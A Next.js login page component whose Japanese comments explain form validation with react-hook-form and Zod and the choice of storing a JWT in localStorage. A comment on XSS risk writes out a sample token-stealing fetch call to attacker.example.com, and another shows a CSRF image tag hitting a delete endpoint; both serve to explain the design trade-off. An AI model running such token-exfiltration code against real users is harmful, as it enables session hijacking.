"use client"

// ============================================================
// 【このファイル全体の方針】
// 【面接で説明できるようにする】なぜ react-hook-form + Zod でバリデーションするか
//   → 入力値の検証をフォームの状態管理と一体化することで、
//     送信ボタン押下時だけでなくフィールドごとにリアルタイムでエラーを出せる。
//     素の HTML <form> + fetch では実現が難しいUX改善が目的。
// 【AI任せでOK】FormItem / FormLabel / FormControl / FormMessage の JSX 構造と Tailwind クラス名
// ============================================================

// ▼ このページが何をするか
// POST /api/auth/login を呼んでログインする。
// 成功したら Zustand の setAuth でトークンを保存し、/dashboard に遷移する。
// 失敗（401）したらエラーメッセージをフォームの下に表示する。

import { useState } from "react"
import { useRouter } from "next/navigation"
import { useForm } from "react-hook-form"
import { zodResolver } from "@hookform/resolvers/zod"
import { z } from "zod"

import api from "@/lib/api"
import { useAuthStore } from "@/store/authStore"
import { AuthResponse } from "@/lib/api-types"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form"

// 【面接で説明できるようにする】なぜ Zod でバリデーションスキーマを定義するか
//   → TypeScript の型と「実行時の値チェック」を一か所にまとめられるから。
//     z.infer<typeof loginSchema> で型を自動生成できるので、型定義とバリデーションが常に一致する。
// 【AI任せでOK】z.string().min() / .refine() など Zod の具体的な書き方は覚えなくていい
// ▼ Zod スキーマ：フォームの入力値に対するバリデーションルール定義
// z.object({}) の中に「フィールド名: ルール」を書く。
// このスキーマを zodResolver に渡すと、react-hook-form がフォーム送信時に自動でバリデーションを実行する。
const loginSchema = z.object({
  // Zod v4 では z.string().email() が非推奨になった。
  // 代わりに z.email() をスタンドアロンで使うか、.refine() の中で safeParse() を使う。
  // ここでは空欄（「入力してください」）と形式エラー（「有効な〜」）で別メッセージを出したいので
  // .min(1) で空欄チェック → .refine() で形式チェック の2段階にしている。
  email: z
    .string()
    .min(1, { message: "メールアドレスを入力してください" })
    .refine((val) => z.email().safeParse(val).success, {
      message: "有効なメールアドレスを入力してください",
    }),
  // z.string().min(8) → 8文字以上でなければエラー
  password: z
    .string()
    .min(8, { message: "パスワードは8文字以上で入力してください" }),
})

// ▼ LoginFormValues
// z.infer<typeof loginSchema> で「スキーマに合致する値の TypeScript 型」を自動生成する。
// { email: string; password: string } と同じ意味だが、スキーマと型を2箇所に書かなくて済む。
type LoginFormValues = z.infer<typeof loginSchema>

export default function LoginPage() {
  const router = useRouter()
  const setAuth = useAuthStore((s) => s.setAuth)

  // 【面接で説明できるようにする】なぜ apiError を useState で、バリデーションエラーは react-hook-form で管理するか
  //   → バリデーションエラーはフォームの状態（入力中・送信前）に紐づくので react-hook-form に任せる。
  //     API エラー（401）はフォームの外から来るサーバー都合の情報なので、useState で別管理する。
  //     2つを混在させると責務が不明確になり、バグの原因になる。
  // ▼ apiError：API が返したエラーメッセージを保持するローカル状態
  // バリデーションエラーは react-hook-form が管理するので useState には入れない。
  // API エラー（401 など）だけここに入れる。
  const [apiError, setApiError] = useState<string | null>(null)

  // ▼ useForm：フォームの状態管理を react-hook-form に委ねる
  // resolver: zodResolver(loginSchema) → フォーム送信時に Zod でバリデーション実行
  // defaultValues → フォームの初期値（空文字で初期化しないと input が uncontrolled になる）
  const form = useForm<LoginFormValues>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      email: "",
      password: "",
    },
  })

  // ▼ onSubmit：フォームが送信されたときに呼ばれる
  // react-hook-form がバリデーション成功後にこの関数を呼ぶ。
  // data には { email: "...", password: "..." } が入っている。
  const onSubmit = async (data: LoginFormValues) => {
    // 前回の API エラーをリセット
    setApiError(null)

    try {
      // ▼ POST /api/auth/login を呼ぶ
      // api は lib/api.ts で作った axios インスタンス。
      // レスポンスの型は AuthResponse（{ token: string }）。
      const response = await api.post<AuthResponse>("/auth/login", {
        email: data.email,
        password: data.password,
      })

      // 【面接で説明できるようにする】なぜ localStorage に JWT を保存するか（Zustand persist の役割）
      //   → Zustand の persist が自動で localStorage に保存・復元する。
      //     セッションストレージだとタブを閉じると消えてしまうが、localStorage なら再訪問時も維持できる。
      //     XSS のリスクはあるが、Cookie の CSRF リスクと天秤にかけた設計判断。
      //
      // ▼ XSS と CSRF のリスクを具体的に理解する
      //
      // 【XSS（Cross-Site Scripting）とは】
      //   攻撃者がこのアプリのページに悪意ある JavaScript を埋め込めた場合、
      //   以下のコードを実行されてしまう。
      //
      //   const token = localStorage.getItem("auth-storage") // JWT が盗れる
      //   fetch("https://attacker.example.com/steal?t=" + token)
      //
      //   localStorage は JavaScript から自由に読めるので、
      //   XSS が成立すると JWT が丸ごと盗まれる。これが localStorage のリスク。
      //
      // 【CSRF（Cross-Site Request Forgery）とは】
      //   Cookie に JWT を保存した場合のリスク。
      //   ブラウザの仕様として、Cookie は宛先ドメインが一致するリクエストに自動でくっついて送られる。
      //   攻撃者の別サイトに以下の HTML を置くだけで攻撃が成立する。
      //
      //   <img src="http://localhost:8080/api/records/delete?id=123" />
      //
      //   この img タグを読み込む瞬間、ブラウザが自動で Cookie を付けてリクエストを送ってしまう。
      //   ユーザーが意図しない操作をサーバーに実行させられる。これが Cookie のリスク。
      //
      // 【なぜ localStorage を選んだか（天秤の中身）】
      //   このアプリは api.ts の interceptor が Authorization: Bearer <token> を
      //   JavaScript で「手動で」ヘッダーにセットする。
      //   → 別サイトの img タグや form から勝手にリクエストを送られても、
      //     Authorization ヘッダーは誰もセットしないので CSRF が構造的に成立しない。
      //
      //   Cookie に HttpOnly を付けると XSS でも Cookie が盗まれなくなる利点があるが、
      //   代わりに CSRF 対策トークンの追加実装が必要になる。
      //
      //   このアプリでは「CSRF が構造的に起きない localStorage を選び、
      //   XSS を混入させないことを React の仕組みで担保する」という判断をしている。
      //
      // ▼ ログイン成功：トークンを Zustand に保存する
      // AuthResponse には token しか入っていないので、userId と displayName は email から仮設定する。
      // バックエンドがユーザー情報を返す API を持っていれば、そちらを呼んで取得するのが正しい。
      // ここでは token だけを使い、userId・displayName は暫定で email を使う。
      const { token } = response.data
      setAuth(token, "", data.email)

      // ▼ /dashboard にリダイレクト
      router.push("/dashboard")
    } catch (error: unknown) {
      // ▼ 401 Conflict → バックエンドが「メールまたはパスワードが違う」と返してきた
      // axios のエラーは error.response.status に HTTP ステータスコードが入っている。
      if (
        error &&
        typeof error === "object" &&
        "response" in error &&
        (error as { response?: { status?: number } }).response?.status === 401
      ) {
        setApiError("メールアドレスまたはパスワードが違います")
      } else {
        setApiError("ログインに失敗しました。しばらく経ってからお試しください")
      }
    }
  }

  // 【AI任せでOK】以下の JSX の Tailwind クラス名（flex, min-h-screen, space-y-6 など）は覚えなくていい
  // 【AI任せでOK】FormItem / FormLabel / FormControl / FormMessage の構造は shadcn/ui が自動生成する定型コード（npx shadcn-ui add form を実行すると生成される）
  return (
    <div className="flex min-h-screen items-center justify-center">
      <div className="w-full max-w-md space-y-6 p-8">
        <div className="space-y-2 text-center">
          <h1 className="text-2xl font-bold">ログイン</h1>
          <p className="text-muted-foreground text-sm">
            メールアドレスとパスワードを入力してください
          </p>
        </div>

        {/* ▼ <Form {...form}>
            form は useForm() が返すオブジェクト（register・control・handleSubmit などが入っている）。
            {...form} で Form（= FormProvider）に渡すと、フォーム内のどこからでも
            useFormContext() でこの methods を取り出せるようになる。 */}
        <Form {...form}>
          {/* ▼ handleSubmit(onSubmit)：フォーム送信時にバリデーションを実行し、
              成功したら onSubmit(data) を呼ぶ。バリデーション失敗時は onSubmit は呼ばれない。 */}
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
            {/* ▼ メールアドレス入力欄 */}
            <FormField
              control={form.control}
              name="email"
              render={({ field }) => (
                // FormItem：ラベル + 入力 + エラーメッセージを囲むコンテナ
                <FormItem>
                  <FormLabel>メールアドレス</FormLabel>
                  {/* FormControl：Input に id と aria-invalid を付与する */}
                  <FormControl>
                    {/* field には value・onChange・onBlur・name・ref が入っている。
                        {...field} で Input に spread すると react-hook-form と繋がる。 */}
                    <Input
                      type="email"
                      placeholder="example@email.com"
                      {...field}
                    />
                  </FormControl>
                  {/* FormMessage：バリデーションエラーがあれば表示する */}
                  <FormMessage />
                </FormItem>
              )}
            />

            {/* ▼ パスワード入力欄 */}
            <FormField
              control={form.control}
              name="password"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>パスワード</FormLabel>
                  <FormControl>
                    <Input type="password" placeholder="8文字以上" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            {/* ▼ API エラーメッセージ（401 が返ってきたときに表示）
                apiError が null のときは何も表示しない。 */}
            {apiError && (
              <p className="text-destructive text-sm">{apiError}</p>
            )}

            {/* ▼ ログインボタン
                form.formState.isSubmitting が true の間（= API 呼び出し中）は disabled になる。
                disabled 中は pointer-events が無効になり、二重送信を防ぐ。 */}
            <Button
              type="submit"
              className="w-full"
              disabled={form.formState.isSubmitting}
            >
              {form.formState.isSubmitting ? "ログイン中..." : "ログイン"}
            </Button>
          </form>
        </Form>

        <p className="text-center text-sm text-muted-foreground">
          アカウントをお持ちでない方は{" "}
          <a href="/signup" className="text-primary underline">
            サインアップ
          </a>
        </p>
      </div>
    </div>
  )
}
